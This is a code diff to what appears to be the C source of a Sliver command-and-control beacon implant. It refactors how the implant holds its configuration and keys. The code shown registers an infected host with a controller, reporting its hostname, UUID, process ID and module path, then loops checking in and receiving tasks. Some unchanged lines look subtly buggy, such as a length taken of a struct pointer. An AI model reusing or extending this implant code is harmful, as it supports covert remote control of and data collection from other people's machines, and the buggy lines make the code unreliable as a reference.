@@ -221,7 +221,7 @@ BOOL BeaconRegister
 	lpLocaleName = ConvertWcharToChar(wszLocale);
 
 	SecureZeroMemory(ElementList, sizeof(ElementList));
-	ElementList[0] = CreateBytesElement(pBeacon->GlobalConfig.szSliverName, lstrlenA(pBeacon->GlobalConfig.szSliverName), 1);
+	ElementList[0] = CreateBytesElement(pBeacon->pGlobalConfig->szSliverName, lstrlenA(pBeacon->pGlobalConfig->szSliverName), 1);
 	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
 	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
 	ElementList[3] = CreateBytesElement(lpFullQualifiedName, lstrlenA(lpFullQualifiedName), 4);
@@ -232,10 +232,10 @@ BOOL BeaconRegister
 	ElementList[8] = CreateVarIntElement(GetCurrentProcessId(), 9);
 	ElementList[9] = CreateBytesElement(lpModulePath, lstrlenA(lpModulePath), 10);
 	ElementList[11] = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
-	ElementList[12] = CreateVarIntElement(pBeacon->GlobalConfig.dwReconnectInterval, 13);
+	ElementList[12] = CreateVarIntElement(pBeacon->pGlobalConfig->dwReconnectInterval, 13);
 
-	ElementList[14] = CreateBytesElement(pBeacon->GlobalConfig.szConfigID, lstrlenA(pBeacon->GlobalConfig.szConfigID), 16);
-	ElementList[15] = CreateVarIntElement(pBeacon->GlobalConfig.uPeerID, 17);
+	ElementList[14] = CreateBytesElement(pBeacon->pGlobalConfig->szConfigID, lstrlenA(pBeacon->pGlobalConfig->szConfigID), 16);
+	ElementList[15] = CreateVarIntElement(pBeacon->pGlobalConfig->uPeerID, 17);
 	ElementList[16] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);
 	
 	BeaconRegElements[0] = CreateBytesElement(pBeacon->szInstanceID, lstrlenA(pBeacon), 1);
@@ -249,7 +249,7 @@ BOOL BeaconRegister
 	RegisterEnvelope.pData->cbBuffer = pFinalElement->cbMarshalledData;
 	RegisterEnvelope.uType = MsgBeaconRegister;
 	pFinalElement->pMarshalledData = NULL;
-	Result = pBeacon->Send(&pBeacon->GlobalConfig, pBeacon->lpClient, &RegisterEnvelope);
+	Result = pBeacon->Send(pBeacon->pGlobalConfig, pBeacon->lpClient, &RegisterEnvelope);
 CLEANUP:
 	if (lpHostName != NULL) {
 		FREE(lpHostName);
@@ -359,26 +359,7 @@ VOID FreeBeaconClient
 			FREE(pBeacon->lpClient);
 		}
 
-		if (pBeacon->GlobalConfig.pSessionKey != NULL) {
-			FREE(pBeacon->GlobalConfig.pSessionKey);
-		}
-
-		if (pBeacon->GlobalConfig.lpRecipientPubKey != NULL) {
-			FREE(pBeacon->GlobalConfig.lpRecipientPubKey);
-		}
-
-		if (pBeacon->GlobalConfig.lpPeerPubKey != NULL) {
-			FREE(pBeacon->GlobalConfig.lpPeerPubKey);
-		}
-
-		if (pBeacon->GlobalConfig.lpPeerPrivKey != NULL) {
-			FREE(pBeacon->GlobalConfig.lpPeerPrivKey);
-		}
-
-		if (pBeacon->GlobalConfig.lpServerMinisignPublicKey != NULL) {
-			FREE(pBeacon->GlobalConfig.lpServerMinisignPublicKey);
-		}
-
+		FreeGlobalConfig(pBeacon->pGlobalConfig);
 		FREE(pBeacon);
 	}
 }
@@ -404,7 +385,7 @@ VOID BeaconWork
 	pBeacon = pWrapper->pBeacon;
 	dwOldInterval = pBeacon->dwInterval;
 	pSendEnvelope = MarshalBeaconTasks(pBeacon, 0, TaskResults, pWrapper->dwNumberOfTasks);
-	if (!pBeacon->Send(&pBeacon->GlobalConfig, pBeacon->lpClient, pSendEnvelope)) {
+	if (!pBeacon->Send(pBeacon->pGlobalConfig, pBeacon->lpClient, pSendEnvelope)) {
 		goto CLEANUP;
 	}
 
@@ -454,7 +435,7 @@ VOID BeaconMainLoop
 		goto CLEANUP;
 	}
 
-	if (!pBeacon->Start(&pBeacon->GlobalConfig, pBeacon->lpClient)) {
+	if (!pBeacon->Start(pBeacon->pGlobalConfig, pBeacon->lpClient)) {
 		goto CLEANUP;
 	}
 
@@ -468,18 +449,18 @@ VOID BeaconMainLoop
 	}
 
 	while (TRUE) {
-		if (dwNumberOfAttempts >= pBeacon->GlobalConfig.dwMaxFailure) {
+		if (dwNumberOfAttempts >= pBeacon->pGlobalConfig->dwMaxFailure) {
 			break;
 		}
 
 		pNextCheckinEnvelope = MarshalBeaconTasks(pBeacon, GetNextCheckin(pBeacon), NULL, 0);
-		if (!pBeacon->Send(&pBeacon->GlobalConfig, pBeacon->lpClient, pNextCheckinEnvelope)) {
+		if (!pBeacon->Send(pBeacon->pGlobalConfig, pBeacon->lpClient, pNextCheckinEnvelope)) {
 			pNextCheckinEnvelope++;
 			continue;
 		}
 
 		FreeEnvelope(pNextCheckinEnvelope);
-		pRecvEnvelope = pBeacon->Receive(&pBeacon->GlobalConfig, pBeacon->lpClient);
+		pRecvEnvelope = pBeacon->Receive(pBeacon->pGlobalConfig, pBeacon->lpClient);
 		if (pRecvEnvelope != NULL) {
 			BeaconTask = UnmarshalBeaconTasks(pRecvEnvelope);
 			FreeEnvelope(pRecvEnvelope);
@@ -526,7 +507,7 @@ PSLIVER_BEACON_CLIENT BeaconInit
 	LPSTR lpUuid = NULL;
 
 	pBeacon = ALLOC(sizeof(SLIVER_BEACON_CLIENT));
-	memcpy(&pBeacon->GlobalConfig, pGlobalConfig, sizeof(GLOBAL_CONFIG));
+	pBeacon->pGlobalConfig = pGlobalConfig;
 	pBeacon->dwInterval = dwInterval;
 	pBeacon->dwJitter = dwJitter;
 	lpUuid = GenerateUUIDv4();
